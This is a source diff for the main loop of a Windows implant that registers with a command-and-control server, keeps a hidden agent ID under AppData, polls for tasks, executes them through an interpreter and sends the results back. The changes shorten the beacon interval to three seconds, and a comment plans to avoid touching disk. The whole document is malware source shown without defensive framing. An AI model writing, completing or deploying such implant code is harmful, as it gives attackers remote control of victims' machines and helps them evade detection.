@@ -1,4 +1,3 @@
-#include "buildoptions.h"
 #include "functions.h"
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
@@ -7,17 +6,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         exit(0);
     }
+
+    //rewrite, use registry so we dont touch disk
     PWSTR config_path;
     std::wstring agent_id;
     SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &config_path);
-    wcscat(config_path, L"\\MB\\.id");
+    wcscat(config_path, L"\\MB");
+    CreateDirectoryW(config_path,NULL);
+    wcscat(config_path, L"\\.id");
     if (GetFileAttributes(config_path) != INVALID_FILE_ATTRIBUTES) {
         std::wifstream cfg_file(config_path);
         std::getline(cfg_file, agent_id);
     }
     else {  
         nlohmann::json registration = communication::RegisterAgent(C2);
-        agent_id = registration["agent_id"].get<std::wstring>();
+        agent_id = std::to_wstring(registration["agent_id"].get<int>());
         std::wofstream cfg_file(config_path);
         cfg_file << agent_id;
     }
@@ -28,11 +31,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
         if (task.contains("task")) {
             nlohmann::json results;
             results["result"] = interpreter::InterpretTask(task["task"].get<std::wstring>());
-
             communication::SubmitResults(C2, agent_id, results);
         }
 
-        Sleep(30000);
+        Sleep(3000);
     }
 
     return 0;
